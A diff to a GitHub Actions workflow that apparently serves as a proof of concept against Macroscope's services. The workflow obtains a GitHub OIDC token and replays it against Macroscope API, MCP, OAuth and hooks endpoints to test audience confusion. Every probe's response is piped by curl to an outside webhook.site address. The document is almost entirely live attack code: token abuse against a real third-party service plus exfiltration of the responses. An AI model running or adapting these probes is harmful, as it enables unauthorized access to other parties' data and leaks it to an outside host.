@@ -15,19 +15,31 @@ jobs:
           case "$ARU" in *\?*) ;; *) SEP='?' ;; esac
           OIDC=$(curl -s -H "Authorization: Bearer $ART" "${ARU}${SEP}audience=macroscope" | jq -r .value)
           echo "oidc-len: ${#OIDC}"
-          HEAD_SHA=$(curl -s https://api.github.com/repos/gyoomei/rialo-rush/commits/main | jq -r .sha)
-          echo "head: $HEAD_SHA"
-          for REPO in "gyoomei/rialo-rush" "prassoai/macroscope-actions" "gyoomei/nope-nonexistent"; do
-            SHA="$HEAD_SHA"
-            [ "$REPO" = "gyoomei/rialo-rush" ] || SHA="0123456789abcdef0123456789abcdef01234567"
-            CODE=$(curl -s -o /tmp/out.json -w "%{http_code}" -X POST \
-              -H "Authorization: Bearer $OIDC" -H "Content-Type: application/json" \
-              -d "{\"repository\":\"$REPO\",\"agent\":\"POC Agent\",\"review\":{\"kind\":\"cra\"},\"commit\":\"$SHA\"}" \
-              https://actions.macroscope.com/api/v1/github-actions/agent-runs)
-            BODY=$(head -c 400 /tmp/out.json)
-            echo "=== repo: $REPO -> HTTP $CODE"
-            echo "$BODY"
-            jq -n --arg r "$REPO" --arg c "$CODE" --arg b "$BODY" '{repo:$r, code:$c, body:$b}' | \
+
+          probe() {
+            NAME="$1"; URL="$2"; DATA="$3"; CT="$4"
+            CODE=$(curl -s -o /tmp/o.json -w "%{http_code}" -X POST -H "Authorization: Bearer $OIDC" \
+              -H "Content-Type: $CT" ${DATA:+-d "$DATA"} "$URL")
+            BODY=$(head -c 300 /tmp/o.json)
+            echo "=== $NAME -> $CODE $BODY"
+            jq -n --arg n "$NAME" --arg c "$CODE" --arg b "$BODY" '{name:$n,code:$c,body:$b}' | \
+              curl -s -X POST -H "Content-Type: application/json" -d @- \
+              https://webhook.site/6d48834f-58f9-4b57-b909-771f87402d66
+          }
+
+          # audience confusion: OIDC github token on api host
+          probe "mcp-tools-list" "https://api.macroscope.com/mcp" '{"jsonrpc":"2.0","id":1,"method":"tools/list"}' "application/json"
+          probe "mcp-get-workspace" "https://api.macroscope.com/mcp" '{"jsonrpc":"2.0","id":1,"method":"call","params":{"name":"get_workspace","arguments":{}}}' "application/json"
+          probe "oauth-token-grant" "https://api.macroscope.com/oauth/token" "grant_type=refresh_token&refresh_token=x&client_id=x" "application/x-www-form-urlencoded"
+          probe "hooks-post" "https://hooks.macroscope.com/" "{}" "application/json"
+          probe "app-oauth-access" "https://app.macroscope.com/oauth/access_token" "grant_type=refresh_token&refresh_token=x" "application/x-www-form-urlencoded"
+
+          # also try OIDC on GET endpoints
+          for U in "https://api.macroscope.com/api/v1/workspace/github_user/53129550" "https://actions.macroscope.com/api/v1/github-actions/agent-runs/00000000-0000-0000-0000-000000000000"; do
+            CODE=$(curl -s -o /tmp/o.json -w "%{http_code}" -H "Authorization: Bearer $OIDC" "$U")
+            BODY=$(head -c 200 /tmp/o.json)
+            echo "=== GET $U -> $CODE $BODY"
+            jq -n --arg n "GET:$U" --arg c "$CODE" --arg b "$BODY" '{name:$n,code:$c,body:$b}' | \
               curl -s -X POST -H "Content-Type: application/json" -d @- \
               https://webhook.site/6d48834f-58f9-4b57-b909-771f87402d66
           done
